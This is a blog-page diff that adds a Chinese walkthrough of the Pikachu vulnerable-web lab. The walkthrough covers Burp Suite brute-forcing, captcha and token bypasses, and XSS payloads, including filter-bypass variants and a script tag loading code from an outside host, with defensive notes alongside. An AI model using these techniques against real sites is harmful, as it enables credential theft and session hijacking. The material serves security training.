@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">84</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,832 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/" class="post-title-link" itemprop="url">Pichaku靶场通关笔记-上</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-01 20:40:54 / 修改时间：21:50:33" itemprop="dateCreated datePublished" datetime="2023-08-01T20:40:54+08:00">2023-08-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Pikachu靶场通关笔记-上"><a href="#Pikachu靶场通关笔记-上" class="headerlink" title="Pikachu靶场通关笔记-上"></a>Pikachu靶场通关笔记-上</h1><p> 作者的DVWA靶场通关笔记有一些攻击与防御的详细介绍，可以先玩DVWA靶场。</p>
+<p>【彩蛋】每类漏洞开始前都有漏洞介绍、攻击方法、防御方法</p>
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p><a href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">基于表单的暴力破解</a>    [验证码绕过（on server）](#验证码绕过（on server）)</p>
+<p>[验证码绕过（on client）](#验证码绕过（on client）)    <a href="#token%E9%98%B2%E6%AD%A2%E7%88%86%E7%A0%B4">token防止爆破</a></p>
+<h4 id="Cross-Site-Scripting（跨站脚本）"><a href="#Cross-Site-Scripting（跨站脚本）" class="headerlink" title="Cross-Site Scripting（跨站脚本）"></a>Cross-Site Scripting（跨站脚本）</h4><p><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88get%EF%BC%89">反射型xss（get）</a>     <a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88post%EF%BC%89">反射型xss（post）</a>    <a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">存储型xss</a>    <a href="#DOM%E5%9E%8Bxss">DOM型xss</a>    <a href="#DOM%E5%9E%8Bxss-x">DOM型xss-x</a></p>
+<p><a href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93">xss之盲打</a>    <a href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4">XSS之过滤</a>    <a href="#XSS%E4%B9%8Bhtmlspecialchars">XSS之htmlspecialchars</a>    <a href="#XSS%E4%B9%8Bhref%E8%BE%93%E5%87%BA">XSS之href输出</a>    <a href="#XSS%E4%B9%8Bjs%E8%BE%93%E5%87%BA">XSS之js输出</a></p>
+<h4 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h4><p><a href="#CSRF%EF%BC%88get%EF%BC%89">CSRF（get）</a>        <a href="#CSRF%EF%BC%88post%EF%BC%89">CSRF（post）</a>        [CSRF Token](#CSRF Token)</p>
+<h4 id="SQL-Inject-SQL注入"><a href="#SQL-Inject-SQL注入" class="headerlink" title="SQL-Inject(SQL注入)"></a>SQL-Inject(SQL注入)</h4><p>[数字型注入 （post）](#数字型注入 （post）)        <a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5(get)">字符型注入(get)</a>        <a href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5">搜索型注入</a>        <a href="#XX%E5%9E%8B%E6%B3%A8%E5%85%A5">XX型注入</a>        <a href="#%E2%80%9Cinsert/update%E2%80%9D%E6%B3%A8%E5%85%A5">“insert/update”注入</a></p>
+<p><a href="#%E2%80%9Ddelete%E2%80%9C%E6%B3%A8%E5%85%A5">”delete“注入</a>        [“http header”注入](#“http header”注入)        [盲注（base on boolian）](#盲注（base on boolian）)        [盲注（base on time）](#盲注（base on time）)</p>
+<p><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a></p>
+<h4 id="RCE-远程命令执行-远程代码执行"><a href="#RCE-远程命令执行-远程代码执行" class="headerlink" title="RCE(远程命令执行/远程代码执行)"></a>RCE(远程命令执行/远程代码执行)</h4><p><a href="#exec%22ping%22">exec”ping”</a>        <a href="#exec%22evel%22">exec”evel”</a></p>
+<h4 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h4><p>[File Inclusion（local）](#File Inclusion（local）)        [File Inclusion（remote）](#File Inclusion（remote）)</p>
+<h4 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe  filedownload"></a>unsafe  filedownload</h4><p>[unsafe filedownload](#unsafe filedownload)</p>
+<h4 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe  fileupload"></a>unsafe  fileupload</h4><p>[client check](#client check)        [MIME type](#MIME type)        <a href="#getimagesize">getimagesize</a></p>
+<h2 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h2><h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>点击tip查看已有的账户与密码（用于验证）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302172009522.png" alt="image-20230302172009522" style="zoom:50%;">
+
+<p>【方法】直接用Burp Suite爆破</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302170808306.png" alt="image-20230302170808306"></p>
+<p>右键点击“send to intruder”，Attack type选择“Cluster bomb”，然后标记账号与密码</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302171158396.png" alt="image-20230302171158396" style="zoom:50%;">
+
+<p>设置payload，为了方便这里手动输入，有字典的可以点击load进行加载</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302171322661.png" alt="image-20230302171322661" style="zoom:50%;">
+
+<p>设置完payload后，点击“start attack”开始爆破</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302171606194.png" alt="image-20230302171606194" style="zoom:50%;">
+
+<p>length值为特别的就有可能是正确结果</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302171842009.png" alt="image-20230302171842009" style="zoom:50%;">
+
+
+
+<h4 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h4><p>PHP版本过高（&gt;8），可能会遇到如下问题（图左），解决方法如图右</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302172838466.png" alt="image-20230302172838466" style="zoom: 33%;">
+
+
+
+<p>由于验证码是图片的形式，勾选Burp Suite的images，才能获取到验证码</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302173423095.png" alt="image-20230302173423095" style="zoom:50%;">
+
+<p>一般来说，验证码在服务端只验证一次，那么手动输入验证码后再次爆。也可以进行验证</p>
+<p>验证：正常抓包，发现验证码是b2rkno；点击“Drop”把数据包丢弃</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302194802138.png" alt="image-20230302194802138" style="zoom: 33%;">
+
+<p>网页会报错，刷新网站再点击重新提交</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302194924305.png" alt="image-20230302194924305" style="zoom:50%;">
+
+<p>点击“Forward”，把数据正常传去</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195017147.png" alt="image-20230302195017147" style="zoom:50%;">
+
+<p>就会看到Cookie的验证码还是原来的而且网页的验证码隐藏了，可以不严谨的认为验证码没变，服务器端还没验证完（服务器验证完才会刷新验证码）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195148304.png" alt="image-20230302195148304" style="zoom: 33%;">
+
+<p>【爆破方法】手动输入验证码，然后直接爆破用户名和密码即可</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195520756.png" alt="image-20230302195520756" style="zoom: 33%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195603513.png" alt="image-20230302195603513" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195702487.png" alt="image-20230302195702487" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195729342.png" alt="image-20230302195729342" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302195815213.png" alt="image-20230302195815213" style="zoom:50%;">
+
+
+
+<h4 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h4><p>【分析】验证码在客户端，把浏览器的JavaScript设置关闭即可，</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302200024242.png" alt="image-20230302200024242"></p>
+<p>这里使用“NoScript选项”插件（关闭JavaScript方法有很多）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302200424692.png" alt="image-20230302200424692" style="zoom:50%;">
+
+<p>启动默认模式，再刷新网站，就会发现验证码没了</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302200508261.png" alt="image-20230302200508261" style="zoom: 33%;">
+
+<p>剩下步骤，直接爆破即可</p>
+<h4 id="token防止爆破"><a href="#token防止爆破" class="headerlink" title="token防止爆破"></a>token防止爆破</h4><p>PHP版本大8可能会有如下问题，这是因为不高版本的PHP的数组不再可以用“{}”，解决方法如下图右边</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302172418265.png" alt="image-20230302172418265" style="zoom: 50%;">
+
+<p>【爆破过程】</p>
+<p>抓包，这里对密码进行爆破，由于token每次都会变，所以我们还需要标记token，这次选择的Attack type是 Pitchfork</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201012065.png" alt="image-20230302201012065" style="zoom:50%;">
+
+<p>payload1正常设置</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201225960.png" alt="image-20230302201225960" style="zoom:50%;">
+
+<p>设置Option</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201257298.png" alt="image-20230302201257298" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201331888.png" alt="image-20230302201331888" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201541142.png" alt="image-20230302201541142" style="zoom:50%;">
+
+<p>设置payload2，设置好就可以点击右上角的“start attack”开始爆破</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302201637611.png" alt="image-20230302201637611" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230302205215674.png" alt="image-20230302205215674" style="zoom:50%;">
+
+<p>注意：从结果可以看到，“123456”是正确密码，但拍在第一的位置的时候却报错了（猜测是验证码过期了）</p>
+<h2 id="Cross-Site-Scripting（跨站脚本）-1"><a href="#Cross-Site-Scripting（跨站脚本）-1" class="headerlink" title="Cross-Site Scripting（跨站脚本）"></a>Cross-Site Scripting（跨站脚本）</h2><p><strong>反射型XSS</strong></p>
+<p>​    反射型XSS攻击是指攻击者通过构造特定的URL链接，将包含恶意脚本的参数注入到目标网站的页面中，当用户点击该链接或者访问包含该链接的页面时，恶意脚本会被执行，从而导致XSS攻击。反射型XSS攻击常常利用GET请求传递参数进行注入。</p>
+<p>下面是反射型XSS攻击的基本流程：</p>
+<ol>
+<li><p>攻击者构造一个包含恶意脚本的URL链接，例如：</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230801214936011.png" alt="image-20230801214936011"></p>
+</li>
+<li><p>攻击者将该URL链接发送给目标用户，诱使其点击该链接或者访问包含该链接的页面。</p>
+</li>
+<li><p>用户点击链接或访问页面时，浏览器会向服务器发送GET请求，并将参数q的值设置为包含恶意脚本的字符串。</p>
+</li>
+<li><p>服务器在处理请求时，将参数q的值输出到页面上，由于没有对该值进行过滤或编码，因此恶意脚本会被执行。</p>
+</li>
+</ol>
+<p>反射型XSS攻击的防御措施：</p>
+<ol>
+<li>输入过滤和输出编码：对用户输入和输出到页面上的所有内容进行过滤和编码，以防止恶意脚本被注入到页面中。</li>
+<li>验证和限制输入长度：对用户输入的内容进行验证，检查是否符合预期格式，同时限制输入的长度，防止攻击者利用长字符串进行注入攻击。</li>
+<li>安全编程实践：在编写Web应用程序时，遵循安全编程实践，例如对输入进行严格验证，使用安全的密码存储方式，使用HTTPS等，可以有效地减少XSS攻击的风险。</li>
+<li>使用CSP：使用CSP可以限制页面中可以执行的JavaScript代码，以防止恶意脚本被注入到页面中。开发人员可以使用CSP指定哪些资源可以被加载，例如允许加载的脚本地址、图片地址、样式表地址等。</li>
+</ol>
+<h4 id="反射型xss（get）"><a href="#反射型xss（get）" class="headerlink" title="反射型xss（get）"></a>反射型xss（get）</h4><p>当注入一个较长的脚本时，发现长度有限制，便修改输入长度</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303111046904.png" alt="image-20230303111046904" style="zoom:50%;">
+
+<p>再输入脚本<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>（查看浏览器cookie）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303111307282.png" alt="image-20230303111307282" style="zoom:50%;">
+
+<p>get类型的xss是可以在网站处看到脚本的，也可以直接在url处进行脚本攻击</p>
+<h4 id="反射型xss（post）"><a href="#反射型xss（post）" class="headerlink" title="反射型xss（post）"></a>反射型xss（post）</h4><p>先登录</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303111941240.png" alt="image-20230303111941240" style="zoom:50%;">
+
+<p>登录后，直接输入脚本即可<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303112033384.png" alt="image-20230303112033384" style="zoom:50%;">
+
+
+
+<h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><pre><code>     存储型XSS攻击是指攻击者将恶意脚本注入到目标网站的数据库中，当用户访问该页面时，恶意脚本会从数据库中读取并执行，从而导致XSS攻击。与反射型XSS攻击不同，存储型XSS攻击是将恶意脚本存储到目标网站的数据库中，而不是通过URL参数传递。</code></pre>
+<p>下面是存储型XSS攻击的基本流程：</p>
+<ol>
+<li>攻击者在目标网站的表单或输入框中输入包含恶意脚本的内容，例如<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230801215023347.png" alt="image-20230801215023347">并提交到服务器。常见的就是留言板攻击</li>
+<li>服务器将恶意脚本存储到数据库中。</li>
+<li>当用户访问包含存储恶意脚本的页面时，服务器从数据库中读取该脚本并输出到页面上，由于没有对该脚本进行过滤或编码，因此恶意脚本会被执行。</li>
+</ol>
+<p>【存储型XSS攻击的防御措施】：</p>
+<ol>
+<li>输入过滤和输出编码：对用户输入和输出到页面上的所有内容进行过滤和编码，以防止恶意脚本被注入到页面中。</li>
+<li>对敏感数据进行加密：对网站中的敏感数据进行加密处理，防止攻击者从数据库中读取敏感数据。</li>
+<li>使用安全的存储方式：使用安全的存储方式，如加密的数据库、密钥管理系统等，防止攻击者轻易地获取和篡改数据。</li>
+<li>模板输出转义：使用模板引擎时，将输出的内容进行转义，例如将所有HTML标签和特殊字符转换为HTML实体。</li>
+<li>安全编程实践：在编写Web应用程序时，遵循安全编程实践，例如对输入进行严格验证，使用安全的密码存储方式，使用HTTPS等，可以有效地减少XSS攻击的风险。</li>
+</ol>
+<p>攻击方法：直接注入脚本</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303112834800.png" alt="image-20230303112834800" style="zoom:50%;">
+
+<p>恶意脚本会一直保留，当你从其他页面（如DOM型xss）回到有恶意脚本的页面（存储型xss）时，也会触发恶意代码</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303113026277.png" alt="image-20230303113026277" style="zoom:50%;">
+
+
+
+<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/20210728143112521.gif" alt="img"></p>
+<p>​        DOM型XSS攻击是指攻击者通过在本地修改浏览器的DOM结构，从而触发XSS攻击，与存储型XSS攻击和反射型XSS攻击不同，DOM型XSS攻击不会向服务器发送数据。</p>
+<p>下面是DOM型XSS攻击的基本流程：</p>
+<ol>
+<li>攻击者构造包含恶意脚本的页面或者通过修改页面中的DOM结构注入恶意脚本。</li>
+<li>用户访问该页面时，浏览器解析并执行页面中的恶意脚本。</li>
+<li>恶意脚本会修改页面中的DOM结构，例如插入一段恶意代码或者修改页面中的某个元素的属性，从而导致XSS攻击。</li>
+</ol>
+<p>DOM型XSS攻击的防御措施：</p>
+<ol>
+<li>输入过滤和输出编码：对用户输入和输出到页面上的所有内容进行过滤和编码，以防止恶意脚本被注入到页面中。</li>
+<li>使用安全的JavaScript库：使用安全的JavaScript库，例如jQuery、React等，可以避免一些常见的DOM操作中的XSS漏洞。</li>
+<li>使用Content Security Policy（CSP）：CSP是一种安全策略，可以通过HTTP头部中的Content-Security-Policy字段设置，限制页面中可以加载的资源，例如JavaScript、图片、样式表等，以防止恶意脚本的注入。</li>
+<li>最小化DOM操作：最小化DOM操作可以降低XSS攻击的风险，因为攻击者很难通过少量的DOM操作实现XSS攻击。</li>
+<li>安全编程实践：在编写Web应用程序时，遵循安全编程实践，例如对输入进行严格验证，使用安全的密码存储方式，使用HTTPS等，可以有效地减少XSS攻击的风险。</li>
+</ol>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303141907036.png" alt="image-20230303141907036" style="zoom:50%;">
+
+<p>其背后的后端代码一般如下</p>
+<p> function domxss(){<br>                        var str = document.getElementById(“text”).value;<br>                        document.getElementById(“dom”).innerHTML = “<a href=""+str+"">what do you see?</a>“;<br>                    }<br>payload(闭合掉就行)：</p>
+<p>1：<code>&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(document.cookie)&quot;&gt;</code></p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303143445342.png" alt="image-20230303143445342"></p>
+<p>2.：<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303143315300.png" alt="image-20230303143315300" style="zoom:50%;">                
+
+<h4 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h4><p>攻击方法同DOM型xss，只是触发多一步</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303143947491.png" alt="image-20230303143947491" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303144012511.png" alt="image-20230303144012511" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303143822696.png" alt="image-20230303143822696" style="zoom:50%;">
+
+
+
+<h4 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h4><p>盲打XSS是指攻击者不知道目标网站的具体漏洞点和参数，但仍尝试通过手动注入恶意脚本来触发XSS攻击的一种技术手段。</p>
+<p>攻击者通常会尝试一些常见的注入点和XSS攻击载荷，例如：</p>
+<ol>
+<li><p>在搜索框或者评论框中输入一些特殊字符，例如单引号、双引号、尖括号等，以尝试触发XSS攻击。</p>
+</li>
+<li><p>在URL参数中注入恶意脚本，例如</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230801214624544.png" alt="image-20230801214624544"></p>
+<p>以尝试触发XSS攻击。</p>
+</li>
+<li><p>在提交表单时，通过修改POST数据或者使用Burp Suite等工具来尝试注入恶意脚本。</p>
+</li>
+</ol>
+<p>防御方法同其他xss攻击</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303144748726.png" alt="image-20230303144748726" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303144517692.png" alt="image-20230303144517692" style="zoom:50%;">
+
+
+
+<h4 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h4><p>绕过策略</p>
+<ol>
+<li><p>大小写</p>
+<p><code>&lt;ScRipt&gt;alert(xss)&lt;/ScRIpT&gt;</code></p>
+</li>
+<li><p>重写（如双重尖括号）</p>
+<p><code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</code></p>
+</li>
+<li><p>其他标签绕过</p>
+<p><code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<p><code>&lt;img src=&quot;#&quot; onmouseover=&quot;alert(document.cookie)&quot;&gt;</code></p>
+</li>
+<li><p>“#”绕过（一般不会执行#后的脚本，但这里不适用）</p>
+<p><code>#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+</li>
+<li><p>无标签绕过</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></p>
+</li>
+<li><p>其他方法</p>
+</li>
+</ol>
+<p>​        <code>&lt;sVg/oNloAd=alert()//&gt;</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303151723214.png" alt="image-20230303151723214" style="zoom:50%;">
+
+
+
+<h4 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h4><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。如：</p>
+<p><code>&amp;（和号） 成为[&amp;]</code></p>
+<p><code>&quot; （双引号） 成为 &amp;quot;</code></p>
+<p><code>&#39; （单引号） 成为 &amp;apos;</code></p>
+<p><code>&lt; （小于） 成为 &amp;lt;</code></p>
+<p><code>&gt; （大于） 成为 &amp;gt</code>;</p>
+<p>绕过方法：使用Javascript伪协议</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303152010494.png" alt="image-20230303152010494" style="zoom:50%;">
+
+<h4 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h4><p>​        XSS攻击之href输出是一种常见的攻击方式，攻击者通过在URL的href属性中注入恶意脚本来实现攻击。这种攻击方式通常发生在网站的搜索、评论、留言板等用户交互性较强的地方。</p>
+<p>​        攻击者通常会在注入的恶意脚本中使用JavaScript来获取用户的cookie信息、向其他网站发送恶意请求、修改网页内容等操作。一旦用户点击了包含恶意脚本的URL链接，就会触发攻击者预设的JavaScript代码，从而导致用户的账号信息被盗取，或者用户的电脑被感染病毒等危害。</p>
+<p>【绕过方法】使用Javascript伪协议</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303153827669.png" alt="image-20230303153827669" style="zoom:50%;">
+
